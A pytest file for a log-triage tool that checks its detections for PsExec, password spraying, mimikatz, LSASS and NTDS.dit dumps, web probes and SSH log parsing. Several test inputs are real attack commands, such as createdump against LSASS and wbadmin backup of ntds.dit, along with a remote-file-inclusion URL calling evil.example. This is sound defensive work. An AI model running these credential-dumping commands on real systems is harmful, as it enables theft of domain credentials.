"""Detections added after testing on public datasets (Hayabusa, Splunk attack_data, OSSEC, fail2ban, Loghub).

Each block names the public sample that was missed before; the events here are small look-alikes."""
import json

from owltriage.detectors import analyze
from owltriage.log_parser import parse_line
from owltriage.rules import load_rules

RULES = load_rules()
SECURITY = "Microsoft-Windows-Security-Auditing"


def rule_ids(result):
    return {f.rule_id for f in result.findings}


def hunt_events(tmp_path, events, **kwargs):
    path = tmp_path / "events.ndjson"
    path.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
    return analyze([path], ruleset=RULES, **kwargs)


def hunt_lines(tmp_path, lines, **kwargs):
    path = tmp_path / "access.log"
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return analyze([path], ruleset=RULES, year=2026, **kwargs)


# 1. PsExec seen only in the Security log (Hayabusa: "PSexec remote execution + admin share")
def test_psexec_service_install_in_the_security_log(tmp_path):
    result = hunt_events(tmp_path, [{
        "EventID": 4697, "ProviderName": SECURITY, "Channel": "Security", "TimeCreated": "2026-11-09T04:00:00Z",
        "SubjectUserName": "admmig", "ServiceName": "PSEXESVC", "ServiceFileName": "%SystemRoot%\\PSEXESVC.exe"}])
    assert "win-psexec-service-security" in rule_ids(result)


def test_psexec_binary_copied_to_the_admin_share(tmp_path):
    share = {"EventID": 5145, "ProviderName": SECURITY, "Channel": "Security", "TimeCreated": "2026-11-09T04:00:00Z",
             "SubjectUserName": "admmig", "IpAddress": "10.23.42.22", "ShareName": "\\\\*\\ADMIN$"}
    result = hunt_events(tmp_path, [{**share, "RelativeTargetName": "PSEXESVC.exe"}])
    assert "win-psexec-share" in rule_ids(result)
    quiet = hunt_events(tmp_path, [{**share, "ShareName": "\\\\*\\Users", "RelativeTargetName": "bob\\notes.txt"}])
    assert "win-psexec-share" not in rule_ids(quiet)


# 2. Password spraying with explicit credentials, event 4648 (DeepBlueCLI password-spray.evtx: 41 accounts)
def explicit_logon(second, account, subject="jwrig", ip="172.16.144.128"):
    return {"EventID": 4648, "ProviderName": SECURITY, "Channel": "Security",
            "TimeCreated": f"2026-11-09T04:{second // 60:02d}:{second % 60:02d}Z",
            "SubjectUserName": subject, "TargetUserName": account, "TargetServerName": "DC01", "IpAddress": ip}


def test_explicit_credentials_against_many_accounts_is_spraying(tmp_path):
    result = hunt_events(tmp_path, [explicit_logon(i * 5, f"user{i}") for i in range(12)])
    spray = [f for f in result.findings if f.rule_id == "win-explicit-credential-spray"]
    assert len(spray) == 1
    assert "12 accounts" in spray[0].detail and spray[0].ip == "172.16.144.128"


def test_a_few_explicit_logons_are_normal(tmp_path):
    runas = [explicit_logon(i * 5, account) for i, account in enumerate(["admin", "backup", "admin", "svc_sql"] * 3)]
    assert "win-explicit-credential-spray" not in rule_ids(hunt_events(tmp_path, runas))


def test_explicit_logons_spread_over_hours_are_not_spraying(tmp_path):
    slow = [explicit_logon(0, f"user{i}") | {"TimeCreated": f"2026-11-09T{i:02d}:00:00Z"} for i in range(12)]
    assert "win-explicit-credential-spray" not in rule_ids(hunt_events(tmp_path, slow, window_seconds=600))


# 3. Mimikatz by its binary name (DeepBlueCLI mimikatz-privesc-hashdump.evtx: 4673) and createdump LSASS dumps
def test_mimikatz_binary_in_a_privilege_use_event(tmp_path):
    result = hunt_events(tmp_path, [{
        "EventID": 4673, "ProviderName": SECURITY, "Channel": "Security", "TimeCreated": "2026-11-09T04:00:00Z",
        "SubjectUserName": "Sec504", "PrivilegeList": "SeTcbPrivilege",
        "ProcessName": "C:\\Tools\\mimikatz\\x64\\mimikatz.exe"}])
    assert "win-mimikatz-binary" in rule_ids(result)


def test_createdump_of_lsass_is_a_credential_dump():
    lsass = RULES.rules["cmd-lsass-dump"]
    assert lsass.search('"C:\\Program Files\\PowerShell\\7\\createdump.exe" -u -f C:\\Temp\\dotnet-lsass.dmp 640')
    assert not lsass.search("createdump.exe -f C:\\dumps\\myapp.dmp 4242")    # dumping your own .NET app


# 4. Web: admin-panel probes (fail2ban nginx-botsearch), remote file inclusion (php-url-fopen),
#    and repeated 401 / POST 403 from one address (traefik-auth, sogo-auth)
def access(path, status=404, method="GET", ip="12.34.56.78", second=0, user="-"):
    return (f'{ip} - {user} [20/Jan/2026:19:{second // 60:02d}:{second % 60:02d} +0100] "{method} {path} HTTP/1.1" '
            f'{status} 47 "-" "Mozilla/5.0"')


def test_admin_panel_probes(tmp_path):
    result = hunt_lines(tmp_path, [access("//phpMyAdmin-2.8.2.3/scripts/setup.php"), access("/pma/index.php")])
    assert "web-admin-panel-probe" in rule_ids(result)
    blog = hunt_lines(tmp_path, [access("/blog/how-to-use-phpmyadmin-safely", 200)])
    assert "web-admin-panel-probe" not in rule_ids(blog)


def test_remote_file_inclusion(tmp_path):
    result = hunt_lines(tmp_path, [access("/index.php?n=http://evil.example/pizza.htm?", 200)])
    assert "web-remote-file-inclusion" in rule_ids(result)
    redirect = hunt_lines(tmp_path, [access("/login?next=https://shop.example/cart?item=4", 302)])
    assert "web-remote-file-inclusion" not in rule_ids(redirect)


def test_repeated_http_auth_failures_are_brute_force(tmp_path):
    result = hunt_lines(tmp_path, [access("/dashboard/", 401, second=i, user=f"u{i}") for i in range(6)])
    brute = [f for f in result.findings if f.rule_id == "auth-brute-force"]
    assert brute and brute[0].ip == "12.34.56.78" and "HTTP" in brute[0].title
    posts = hunt_lines(tmp_path, [access("/SOGo/connect", 403, "POST", second=i) for i in range(6)])
    assert "auth-brute-force" in rule_ids(posts)


def test_forbidden_pages_and_a_few_401s_are_not_brute_force(tmp_path):
    forbidden = hunt_lines(tmp_path, [access(f"/private/{i}", 403, second=i) for i in range(10)])  # GET 403s
    assert "auth-brute-force" not in rule_ids(forbidden)
    login_flow = hunt_lines(tmp_path, [access("/dashboard/", 401, second=i) for i in range(3)])
    assert "auth-brute-force" not in rule_ids(login_flow)


# 5. Linux: SUSE useradd (OSSEC samples) and old OpenSSH lines without "port N" (Loghub, OSSEC)
def test_suse_useradd_is_a_new_user(tmp_path):
    result = hunt_lines(tmp_path, [
        "Sep 15 17:11:27 myserver useradd[13542]: new account added - account=fred, uid=1016, gid=100, "
        "home=/home/fred, shell=/bin/bash, by=0"])
    assert "linux-new-user" in rule_ids(result)


def test_old_openssh_invalid_user_lines_without_a_port():
    for line in ("Dec 10 06:55:46 LabSZ sshd[24200]: Invalid user webmaster from 173.234.31.186",
                 "Aug  1 18:27:45 knight sshd[20325]: Illegal user test from 218.49.183.17"):
        event = parse_line(line, 1, "auth.log", 2026)
        assert event.kind == "auth_invalid_user" and event.ip in line and event.user in ("webmaster", "test")


def test_old_openssh_lines_still_cannot_be_spoofed_by_the_username():
    event = parse_line("Dec 10 06:55:46 LabSZ sshd[1]: Invalid user x from 6.6.6.6 from 173.234.31.186", 1, "a", 2026)
    assert event.ip == "173.234.31.186"


def test_illegal_user_prefix_is_not_part_of_the_username():
    event = parse_line("Aug  1 18:27:46 knight sshd[1]: Failed password for illegal user test from 218.49.183.17 "
                       "port 48849 ssh2", 1, "auth.log", 2026)
    assert event.kind == "auth_failure" and event.user == "test"


def test_failures_slightly_out_of_order_still_count_as_one_window(tmp_path):
    """fail2ban's traefik sample: five 401s inside 4 seconds, one of them logged a moment late."""
    seconds = [0, 0, 4, 4, 0]
    result = hunt_lines(tmp_path, [access("/dashboard/", 401, second=s, ip="10.0.0.2") for s in seconds])
    assert "auth-brute-force" in rule_ids(result)


# 6. ntds.dit through Windows Server Backup (The DFIR Report on Akira, Jun 2026): the one step the
#    2026 ransomware replay missed. Backing up or restoring the AD database by name is a dump.
def test_wbadmin_backup_or_restore_of_ntds_dit_is_a_credential_dump(tmp_path):
    ntds = RULES.rules["cmd-ntds-dump"]
    assert ntds.search("wbadmin start backup -backupTarget:\\\\10.0.0.9\\b "
                       "-include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet")
    assert ntds.search("wbadmin.exe start recovery -version:11/09/2026-03:13 -itemType:File "
                       "-items:C:\\Windows\\NTDS\\ntds.dit -recoveryTarget:C:\\Temp -quiet")
    assert not ntds.search("wbadmin start systemstatebackup -backupTarget:E: -quiet")    # routine DC backup
    assert not ntds.search("wbadmin get versions -backupTarget:E:")
    result = hunt_events(tmp_path, [{
        "EventID": 4688, "ProviderName": SECURITY, "Channel": "Security", "Computer": "DC01",
        "TimeCreated": "2026-11-09T03:13:00Z", "SubjectUserName": "svc_backup",
        "NewProcessName": "C:\\Windows\\System32\\wbadmin.exe",
        "CommandLine": "wbadmin start backup -backupTarget:\\\\10.0.0.9\\b -include:C:\\Windows\\NTDS\\ntds.dit -quiet"}])
    assert "cmd-ntds-dump" in rule_ids(result)
